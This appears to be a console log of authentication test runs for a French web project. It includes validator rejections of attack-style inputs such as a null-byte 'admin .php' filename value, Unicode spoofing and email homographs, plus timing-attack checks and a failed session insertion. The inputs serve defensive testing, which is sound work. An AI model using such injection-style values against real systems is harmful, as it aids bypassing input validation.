(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:64:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te null bytes: admin .php
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous input in email
    at rejectDangerous (C:/Users/Utilisateur/Documents
/concordia/src/lib/auth/validate-user.ts:37:45)
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:116:5)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:64:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te unicode spoofing: ´¢ô´¢â´¢Æ´¢ë´¢É´¢ö
[22m[39mcreateTestUser error: [InternalAPIError: 
Username is invalid] {
  status: [32m'BAD_REQUEST'[39m,
  body: { code: [32m'USERNAME_IS_INVALID'[39m, 
message: [32m'Username is invalid'[39m },
  headers: {},
  statusCode: [33m400[39m
}

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te unicode spoofing: ØôêØÆ©ØôçØÆ¥ØôàØôë
[22m[39mcreateTestUser error: [InternalAPIError: 
Username is invalid] {
  status: [32m'BAD_REQUEST'[39m,
  body: { code: [32m'USERNAME_IS_INVALID'[39m, 
message: [32m'Username is invalid'[39m },
  headers: {},
  statusCode: [33m400[39m
}

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te unicode spoofing: ØòñØòöØòúØòÜØòíØòÑ
[22m[39mcreateTestUser error: [InternalAPIError: 
Username is invalid] {
  status: [32m'BAD_REQUEST'[39m,
  body: { code: [32m'USERNAME_IS_INVALID'[39m, 
message: [32m'Username is invalid'[39m },
  headers: {},
  statusCode: [33m400[39m
}

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te email homograph attack
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous email homograph attack
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:123:35)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:78:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mlimite longueur champs
[22m[39mcreateTestUser error: Error: Validation 
error: invalid username length
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:128:62)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:82:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mPassword Security[2m > [22m[2mrej├¿te 
password faible: 'common dictionary'
[22m[39mcreateTestUser error: Error: Validation 
error: weak or dangerous password input
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:178:15)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:99:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mPassword Security[2m > [22m[2mrej├¿te 
password faible: 'sequential'
[22m[39mcreateTestUser error: Error: Validation 
error: context predictable or dangerous password input
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:162:15)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:99:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mPassword Security[2m > [22m[2mrej├¿te 
password faible: 'sequential letters'
[22m[39mcreateTestUser error: Error: Validation 
error: weak or dangerous password input
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:178:15)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:99:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mPassword Security[2m > [22m[2mrej├¿te 
password faible: 'common pattern'
[22m[39mcreateTestUser error: Error: Validation 
error: weak or dangerous password input
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:178:15)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:99:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mPassword Security[2m > [22m[2mrej├¿te 
password faible: 'keyboard pattern'
[22m[39mcreateTestUser error: Error: Validation 
error: weak or dangerous password input
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:178:15)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:99:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mPassword Security[2m > [22m[2mrej├¿te 
password faible: 'leet speak common'
[22m[39mcreateTestUser error: Error: Validation 
error: leet speak or dangerous password input
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:186:71)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:99:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mPassword Security[2m > [22m[2mrej├¿te 
password faible: 'repetition'
[22m[39mcreateTestUser error: Error: Validation 
error: repetitive or dangerous password input
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:144:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:99:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mPassword Security[2m > [22m[2mrej├¿te 
password faible: 'context predictable'
[22m[39mcreateTestUser error: Error: Validation 
error: context predictable or dangerous password input
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:148:44)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:99:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstdout[2m | tests/integration/auth-flow.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/integration/auth-flow.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mPassword Security[2m > [22m[2mhash password diff├®rent pour m├¬me password
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463499324-0.557085057006101'[39m,
  to: [32m'test-3c64b1bd-f24d-4825-8d88-5b7c1279acb5@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mPassword Security[2m > [22m[2mhash password diff├®rent pour m├¬me password
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463499645-0.2716019670704415'[39m,
  to: [32m'test-979d241f-c31d-434d-8c34-9141723dd398@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/auth-flow.test.ts[2m > [22m[2mAuth ÔÇö critical integration tests[2m > [22m[2msign-up creates user and audit log
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463499717-0.43464594964251146'[39m,
  to: [32m'signup-17f081ec-5a6d-4fa8-b12a-880bd0e9ab87@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mConnexion S├®curis├®e[2m > [22m[2mJWT a claims s├®curis├®s
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463499999-0.3974879217684433'[39m,
  to: [32m'test-a60b442f-8543-42b8-bc40-fbe2b4bb8fcd@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/auth-flow.test.ts[2m > [22m[2mAuth ÔÇö critical integration tests[2m > [22m[2msign-in returns token for valid credentials
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463500143-0.8862302423330677'[39m,
  to: [32m'signin-3faa9940-658c-4153-8ce4-f6130a379c10@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/auth-flow.test.ts[2m > [22m[2mAuth ÔÇö critical integration tests[2m > [22m[2msign-in returns token for valid credentials
[22m[39mDEBUG: created.user.id = 3uRLLisHYAIoD79kde6WPto2vjqS4yzq

[90mstdout[2m | tests/integration/auth-flow.test.ts[2m > [22m[2mAuth ÔÇö critical integration tests[2m > [22m[2msign-in returns token for valid credentials
[22m[39mDEBUG: users found for email signin-3faa9940-658c-4153-8ce4-f6130a379c10@test.local [ [32m'3uRLLisHYAIoD79kde6WPto2vjqS4yzq'[39m ]

[90mstdout[2m | tests/i18n/slug-map.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstderr[2m | 
tests/integration/auth-flow.test.ts[2m > 
[22m[2mAuth ÔÇö critical integration tests[2m > 
[22m[2msign-in returns token for valid credentials
[22m[39mloginTestUser error: DrizzleQueryError: 
Failed query: insert into "session" ("id", 
"expires_at", "token", "created_at", "updated_at", 
"ip_address", "user_agent", "user_id", 
"active_organization_id", "impersonated_by") values 
($1, $2, $3, $4, $5, $6, $7, $8, default, default) 
returning "id", "expires_at", "token", "created_at", 
"updated_at", "ip_address", "user_agent", "user_id", 
"active_organization_id", "impersonated_by"
params: Hk15za7Wc2AArf6OXUN4zb58xwIhVYdf,2026-03-09T14
:58:20.486Z,N92fUN1L9KWpaTYuxIceHlxr9vKxx92l,2026-03-0
2T14:58:20.486Z,2026-03-02T14:58:20.486Z,,,3uRLLisHYAI
oD79kde6WPto2vjqS4yzq
    at NodePgPreparedQuery.queryWithCache [90m(file:/
//C:/Users/Utilisateur/Documents/concordia/[39mnode_m
odules/[4m.pnpm[24m/drizzle-orm@0.45.1_@prisma+_adef
033d447e1fca34f3f6403b40317c/node_modules/[4mdrizzle-
orm[24m/pg-core/session.js:41:15[90m)[39m
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/drizzle-orm@0.
45.1_@prisma+_adef033d447e1fca34f3f6403b40317c/node_mo
dules/[4mdrizzle-orm[24m/node-postgres/session.js:11
7:22
[90m    ... 4 lines matching cause stack trace 
...[39m
    at Object.createSession [90m(file:///C:/Users/Uti
lisateur/Documents/concordia/[39mnode_modules/[4m.pn
pm[24m/better-auth@1.4.18_@prisma+_69d76cae5fd43a943b
38aaed366efea4/node_modules/[4mbetter-auth[24m/dist/
db/internal-adapter.mjs:149:11[90m)[39m
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/better-auth@1.
4.18_@prisma+_69d76cae5fd43a943b38aaed366efea4/node_mo
dules/[4mbetter-auth[24m/dist/api/routes/sign-in.mjs
:237:18
    at internalHandler [90m(file:///C:/Users/Utilisat
eur/Documents/concordia/[39mnode_modules/[4m.pnpm[2
4m/better-call@1.1.8_zod@4.3.6/node_modules/[4mbetter
-call[24m/dist/endpoint.mjs:30:20[90m)[39m {
  query: [32m'insert into "session" ("id", 
"expires_at", "token", "created_at", "updated_at", 
"ip_address", "user_agent", "user_id", 
"active_organization_id", "impersonated_by") values 
($1, $2, $3, $4, $5, $6, $7, $8, default, default) 
returning "id", "expires_at", "token", "created_at", 
"updated_at", "ip_address", "user_agent", "user_id", 
"active_organization_id", "impersonated_by"'[39m,
  params: [
    [32m'Hk15za7Wc2AArf6OXUN4zb58xwIhVYdf'[39m,
    [32m'2026-03-09T14:58:20.486Z'[39m,
    [32m'N92fUN1L9KWpaTYuxIceHlxr9vKxx92l'[39m,
    [32m'2026-03-02T14:58:20.486Z'[39m,
    [32m'2026-03-02T14:58:20.486Z'[39m,
    [32m''[39m,
    [32m''[39m,
    [32m'3uRLLisHYAIoD79kde6WPto2vjqS4yzq'[39m
  ],
  cause: error: une instruction insert ou update sur 
la table ┬½ session ┬╗ viole la contrainte de cl├®
  ├®trang├¿re ┬½ session_user_id_user_id_fk ┬╗
      at [90mC:\Users\Utilisateur\Documents\concordia
\[39mnode_modules\[4m.pnpm[24m\pg@8.18.0\node_modul
es\[4mpg[24m\lib\client.js:624:17
  [90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
      at [90mfile:///C:/Users/Utilisateur/Documents/c
oncordia/[39mnode_modules/[4m.pnpm[24m/drizzle-orm@
0.45.1_@prisma+_adef033d447e1fca34f3f6403b40317c/node_
modules/[4mdrizzle-orm[24m/node-postgres/session.js:
124:18
      at NodePgPreparedQuery.queryWithCache [90m(file
:///C:/Users/Utilisateur/Documents/concordia/[39mnode
_modules/[4m.pnpm[24m/drizzle-orm@0.45.1_@prisma+_ad
ef033d447e1fca34f3f6403b40317c/node_modules/[4mdrizzl
e-orm[24m/pg-core/session.js:39:16[90m)[39m
      at [90mfile:///C:/Users/Utilisateur/Documents/c
oncordia/[39mnode_modules/[4m.pnpm[24m/drizzle-orm@
0.45.1_@prisma+_adef033d447e1fca34f3f6403b40317c/node_
modules/[4mdrizzle-orm[24m/node-postgres/session.js:
117:22
      at withReturning [90m(file:///C:/Users/Utilisat
eur/Documents/concordia/[39mnode_modules/[4m.pnpm[2
4m/better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aae
d366efea4/node_modules/[4mbetter-auth[24m/dist/adapt
ers/drizzle-adapter/drizzle-adapter.mjs:18:45[90m)[3
9m
      at Object.create [90m(file:///C:/Users/Utilisat
eur/Documents/concordia/[39mnode_modules/[4m.pnpm[2
4m/better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38aae
d366efea4/node_modules/[4mbetter-auth[24m/dist/adapt
ers/drizzle-adapter/drizzle-adapter.mjs:131:12[90m)[
39m
      at Object.create [90m(file:///C:/Users/Utilisat
eur/Documents/concordia/[39mnode_modules/[4m.pnpm[2
4m/@better-auth+core@1.4.18_@b_e298d21959413fbce6f1495
fa56e1343/node_modules/[4m@better-auth[24m/core/dist
/db/adapter/factory.mjs:414:16[90m)[39m
      at createWithHooks [90m(file:///C:/Users/Utilis
ateur/Documents/concordia/[39mnode_modules/[4m.pnpm
[24m/better-auth@1.4.18_@prisma+_69d76cae5fd43a943b38a
aed366efea4/node_modules/[4mbetter-auth[24m/dist/db/
with-hooks.mjs:21:69[90m)[39m
      at Object.createSession [90m(file:///C:/Users/U
tilisateur/Documents/concordia/[39mnode_modules/[4m.
pnpm[24m/better-auth@1.4.18_@prisma+_69d76cae5fd43a94
3b38aaed366efea4/node_modules/[4mbetter-auth[24m/dis
t/db/internal-adapter.mjs:149:11[90m)[39m {
    length: [33m347[39m,
    severity: [32m'ERREUR'[39m,
    code: [32m'23503'[39m,
    detail: [32m"La cl├® 
(user_id)=(3uRLLisHYAIoD79kde6WPto2vjqS4yzq) n'est 
pas pr├®sente dans la table ┬½ user ┬╗."[39m,
    hint: [90mundefined[39m,
    position: [90mundefined[39m,
    internalPosition: [90mundefined[39m,
    internalQuery: [90mundefined[39m,
    where: [90mundefined[39m,
    schema: [32m'public'[39m,
    table: [32m'session'[39m,
    column: [90mundefined[39m,
    dataType: [90mundefined[39m,
    constraint: 
[32m'session_user_id_user_id_fk'[39m,
    file: [32m'ri_triggers.c'[39m,
    line: [32m'2610'[39m,
    routine: [32m'ri_ReportViolation'[39m
  }
}

[90mstderr[2m | tests/i18n/slug-map.test.ts
[22m[39mCleanup error: QueryError: ERROR: function 
replace(text,text,text) does not exist
HINT: ƒö¿ Please note that pg-mem implements very few 
native functions.

            ƒæë You can specify the functions you 
would like to use via 
"db.public.registerFunction(...)"

ƒÉ£ This seems to be an execution error, which means 
that your request syntax seems okay,
    but the resulting statement cannot be executed 
ÔåÆ Probably not a pg-mem error.

*´©ÅÔâú Reconsituted failed SQL statement: UPDATE 
blog_organizations   SET slug = (lower ((replace 
(name, (' '), ('-')) )) )  WHERE (slug IS NULL)

ƒæë You can file an issue at 
https://github.com/oguimbal/pg-mem along with a way 
to reproduce this error (if you can), and  the 
stacktrace:


    at buildCall [90m(C:\Users\Utilisateur\Documents\
concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.
13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.j
s:8211:15[90m)[39m
    at Object.function [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:3497:46[90m)[39m
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1636:38[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m
    at [90mC:\Users\Utilisateur\Documents\concordia\
[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.13_kysely@0
.28.11\node_modules\[4mpg-mem[24m\index.js:1635:36
    at Array.map (<anonymous>)
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1635:27[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m {
  data: {
    error: [32m'function replace(text,text,text) 
does not exist'[39m,
    hint: [32m'ƒö¿ Please note that pg-mem 
implements very few native functions.\n'[39m +
      [32m'\n'[39m +
      [32m'            ƒæë You can specify the 
functions you would like to use via 
"db.public.registerFunction(...)"'[39m
  },
  code: [90mundefined[39m,
  location: { start: [33m0[39m, end: [33m0[39m },
  [[32mSymbol(errorDetailsIncluded)[39m]: 
[33mtrue[39m
}

[90mstdout[2m | tests/i18n/slug-map.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/i18n/slug-map.test.ts [2m([22m[2m11 tests[22m[2m)[22m[33m 437[2mms[22m[39m
[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te timing attack (temps similaire)
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463500665-0.976312470157918'[39m,
  to: [32m'test-f2931216-a900-4cdf-830b-8ee3b87d3292@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/auth-flow.test.ts[2m > [22m[2mAuth ÔÇö critical integration tests[2m > [22m[2msign-in with invalid password logs login_failed
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463500846-0.8599291613345479'[39m,
  to: [32m'badpass-43871004-dc9d-4afc-a4dd-6c0a48227eb5@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te 
timing attack (temps similaire)
[22m[39m[2m2026-03-02T14:58:20.980Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m Invalid password

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te 
timing attack (temps similaire)
[22m[39mloginTestUser error: [InternalAPIError: 
Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstderr[2m | 
tests/integration/auth-flow.test.ts[2m > 
[22m[2mAuth ÔÇö critical integration tests[2m > 
[22m[2msign-in with invalid password logs 
login_failed
[22m[39m[2m2026-03-02T14:58:21.139Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m Invalid password

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te 
timing attack (temps similaire)
[22m[39m[2m2026-03-02T14:58:21.267Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m Invalid password

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te 
timing attack (temps similaire)
[22m[39mloginTestUser error: [InternalAPIError: 
Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstdout[2m | tests/integration/auth-flow.test.ts[2m > [22m[2mAuth ÔÇö critical integration tests[2m > [22m[2mduplicate sign-up is rejected
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463501506-0.09260779913305028'[39m,
  to: [32m'dup-26844e87-df35-45ca-aa55-2fd2ed83afec@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/auth-flow.test.ts
[22m[39m
Ô£à Test suite complete


 [31mÔØ»[39m tests/integration/auth-flow.test.ts [2m([22m[2m4 tests[22m[2m | [22m[31m1 failed[39m[2m)[22m[33m 2270[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m sign-up creates user and audit log [33m 317[2mms[22m[39m
[31m     [31m├ù[31m sign-in returns token for valid credentials[39m[33m 781[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m sign-in with invalid password logs login_failed [33m 659[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m duplicate sign-up is rejected [33m 345[2mms[22m[39m
[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te 
timing attack (temps similaire)
[22m[39m[2m2026-03-02T14:58:21.582Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m User not found 
{ email: [32m'test-f2931216-a900-4cdf-830b-8ee3b87d32
92@test.local'[39m }

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te 
timing attack (temps similaire)
[22m[39mloginTestUser error: [InternalAPIError: 
Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te 
timing attack (temps similaire)
[22m[39m[2m2026-03-02T14:58:21.865Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m User not found 
{ email: [32m'test-f2931216-a900-4cdf-830b-8ee3b87d32
92@test.local'[39m }

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te 
timing attack (temps similaire)
[22m[39mloginTestUser error: [InternalAPIError: 
